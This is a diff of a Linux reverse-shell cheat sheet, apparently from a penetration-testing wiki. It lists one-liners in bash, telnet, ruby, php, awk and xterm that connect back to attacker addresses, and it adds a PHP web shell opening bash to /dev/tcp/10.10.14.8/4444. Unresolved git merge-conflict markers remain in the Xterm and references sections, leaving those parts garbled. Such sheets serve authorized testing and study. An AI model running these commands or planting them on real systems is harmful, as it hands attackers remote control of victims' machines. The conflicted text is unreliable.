@@ -1,12 +1,12 @@
 # Shells - Linux
 
-**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com/)\*\*\*\*
+**If you have questions about any of these shells you could check them with **[**https://explainshell.com/**](https://explainshell.com)****
 
 ## Full TTY
 
-**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
+**Once you get a reverse shell**[** read this page to obtain a full TTY**](full-ttys.md)**.**
 
-## Bash \| sh
+## Bash | sh
 
 ```bash
 curl http://reverse-shell.sh/1.1.1.1:3000 | bash
@@ -67,7 +67,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 while true; do nc -l <port>; done
 ```
 
-To send the command write it down, press enter and press CTRL+D \(to stop STDIN\)
+To send the command write it down, press enter and press CTRL+D (to stop STDIN)
 
 **Victim**
 
@@ -103,6 +103,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 
 ## Java
@@ -168,7 +169,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 
 ## OpenSSH
 
-Attacker \(Kali\)
+Attacker (Kali)
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
@@ -218,7 +219,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 while true; do nc -l 79; done
 ```
 
-To send the command write it down, press enter and press CTRL+D \(to stop STDIN\)
+To send the command write it down, press enter and press CTRL+D (to stop STDIN)
 
 **Victim**
 
@@ -255,19 +256,27 @@ BEGIN {
 
 ## Xterm
 
+<<<<<<< HEAD
 One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
+=======
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+>>>>>>> 72cbd88461ed0e65da5433596050dd2ecb643f6b
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
+<<<<<<< HEAD
 To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\). One way to do this is with Xnest \(to be run on your system\):
+=======
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+>>>>>>> 72cbd88461ed0e65da5433596050dd2ecb643f6b
 
 ```bash
 Xnest :1
 ```
 
-You’ll need to authorise the target to connect to you \(command also run on your host\):
+You’ll need to authorise the target to connect to you (command also run on your host):
 
 ```bash
 xhost +targetip
@@ -290,7 +299,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 {% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" caption="" %}
 
+<<<<<<< HEAD
 {% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" caption="" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" caption="" %}
 
+=======
+>>>>>>> 72cbd88461ed0e65da5433596050dd2ecb643f6b
